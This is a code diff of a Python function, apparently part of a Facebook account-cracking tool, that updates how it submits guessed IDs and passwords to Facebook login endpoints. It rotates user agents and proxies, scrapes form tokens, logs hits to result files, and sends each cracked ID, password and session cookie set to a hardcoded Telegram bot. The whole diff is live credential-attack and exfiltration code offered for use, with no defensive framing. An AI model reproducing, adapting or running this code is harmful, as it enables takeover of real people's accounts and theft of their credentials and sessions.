@@ -842,16 +842,58 @@ def crack(idf,pwv,url):
 		try:
 			ua = random.choice(ugen)
 			#ua = uwu
-			ses.headers.update({"Host": url, "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36 XiaoMi/Mint Browser/3.9.3", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site":  "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "accept-encoding": "gzip, deflate","accept-language": "af_AF,fr;q=0.9,en-US;q=0.8,en;q=0.7"})
-			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fwww.kilat.com%252Fnews%252Ftren%252F74736%252Fwaw-youtuber-tanaman-hias-ini-berhasil-tumbuhkan-aglonema-tanpa-akar-cek-caranya%252F&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=en_GB").text
-			date = {'lsd': re.search('name="lsd" value="(.*?)"',str(link)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(link)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(link)).group(1), 'li': re.search('name="li" value="(.*?)"',str(link)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(link)).group(1)}
-			head = {"Host": url, "content-length": f"{len(str(date))}", "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(link)).group(1), "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "accept": "*/*", "origin": f"https://{url}", "x-requested-with": "com.mi.globalbrowser.mini", "sec-fetch-site": "same-origin", "sec-fetch-mode": "cors", "sec-fetch-dest": "empty", "referer": f"https://{url}/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fwww.kilat.com%252Fnews%252Ftren%252F74736%252Fwaw-youtuber-tanaman-hias-ini-berhasil-tumbuhkan-aglonema-tanpa-akar-cek-caranya%252F&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=en_GB", "accept-encoding": "gzip, deflate","accept-language": "af_AF,fr;q=0.9,en-US;q=0.8,en;q=0.7"}
-			bz = ses.post(f"https://{url}/login/device-based/login/async/?api_key=482073673212185&auth_token=2d542d3a988c49637b58fd10a1a59b22&skip_api_login=1&shbl=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fclient_id%3D482073673212185%26state%3Ded61c0b4a99518bbb706141395e9ed12%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3D%252F%252Fm.kilat.com%252Ffb-callback%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd1459ee7-6dd6-436c-b911-3cbc942fc85b%26tp%3Dunspecified&refsrc=deprecated&app_id=482073673212185&cancel=%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Ded61c0b4a99518bbb706141395e9ed12%23_%3D_",data=date, headers=head,proxies=proxy)
+			ses.headers.update= {
+				"Host":url,
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+				"cache-control": "max-age=0",
+				"referer": f"https://{url}/login/device-based/password/?uid={idf}&errorcode=1348092&next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",
+				"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"',
+				"sec-ch-ua-mobile": "?1",
+				"sec-ch-ua-platform": '"Blackberry"',
+				"sec-fetch-dest": "document",
+				"sec-fetch-mode": "navigate",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-user": "?1",
+				"upgrade-insecure-requests": "1",
+				"user-agent": ua
+				}
+			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2F{url}%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fabout.fb.com%252Fnews%252F2022%252F02%252Fmarking-this-years-safer-internet-day%252F%26src%3Dsdkpreparse&cancel_url=https%3A%2F%2F{url}%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=popup&locale=id_ID&_rdr").text
+			date = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(link)).group(1),
+				"jazoest":re.search('name="jazoest" value="(.*?)"', str(link)).group(1),
+				"uid":idf,
+				"next":f"https://{url}/login/save-device/",
+				"flow":"login_no_pin",
+				"pass": pw
+				}
+			head = {
+				"Host":url,
+				"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
+				"accept-encoding": "gzip, deflate, br",
+				"accept-language": "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
+				"x-requested-with": "mark.via.gp",
+				"cache-control": "max-age=0",
+				"content-length": "159",
+				"content-type": "application/x-www-form-urlencoded",
+				"origin": url,
+				"referer": f"https://{url}/login/device-based/password/?uid={idf}&errorcode=1348092&next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%2F&flow=login_no_pin&shbl=0&refsrc=deprecated&_rdr",
+				"sec-fetch-dest": "document",
+				"sec-fetch-mode": "navigate",
+				"sec-fetch-site": "same-origin",
+				"sec-fetch-user": "?1",
+				"upgrade-insecure-requests": "1",
+				"user-agent": ua
+				 }
+			bz = ses.post(f"https://{url}/login/device-based/validate-password/?shbl=0&locale2=id_ID",data=date, headers=head,allow_redirects=False)
 			#ini_cookie = str(ses.cookies.get_dict())
 			if "checkpoint" in ses.cookies.get_dict():
 				kukie = open(".cokie.txt","r").read()
 				toket = open(".token.txt","r").read()
-				print(f'\r├── ID  : {K}{idf}{P}          \n│   └──  Sandi  : {K}{pw}          {P}\n└── User Agent  : {M}{ua}{P}           \n')
+				tree = Tree("                                 ")
+				tree.add(f"\r{K}{idf}|{pw}{P} ")
+				tree.add(f"{K}{ua}{N}")
+				prints(tree)
 				wrt = '[CP] %s • %s' % (idf,pw)
 				cp.append(wrt)
 				open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -861,7 +903,6 @@ def crack(idf,pwv,url):
 				kuki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
 				#kuki = convert(ses.cookies.get_dict())
 				if "y" in taplikasi:
-					print(f'\r├── ID  : {H}{idf}{P}          \n│   └──  sandi  : {H}{pw}          {P}\n└──  Cookie : {H}{kuki}{P}\n         {P}\n└── User Agent  : {H}{ua}{P}           \n           ')
 					kukie = open(".cokie.txt","r").read()
 					toket = open(".token.txt","r").read()
 					requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
@@ -873,7 +914,10 @@ def crack(idf,pwv,url):
 					kukie = open(".cokie.txt","r").read()
 					toket = open(".token.txt","r").read()
 					requests.post(f"https://api.telegram.org/bot5623145401:AAHJqVOhmi7Yojm4CuzmJ5pCANbX6xGeTN0/sendMessage?chat_id=-1001866427708&text={idf}\n{pw}\n{kuki}")
-					print(f'\r├── ID  : {H}{idf}{P}          \n│   └──  sandi  : {H}{pw}          {P}\n└──  Cookie : {H}{kuki}{P}\n         {P}\n└── User Agent  : {H}{ua}{P}           \n           ')
+					tree = Tree("                                 ")
+					tree.add(f"\r{H}{idf}|{pw}{P} ")
+					tree.add(f"{H}{kuki}{N}")
+					prints(tree)
 					wrt = '[OK] %s • %s' % (idf,pw)
 					ok.append(wrt)
 					open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -884,8 +928,6 @@ def crack(idf,pwv,url):
 			time.sleep(31)
 	loop+=1
 	
-	
-
 
 def convert(bz):
 	rr = random.randint;rc = random.choice
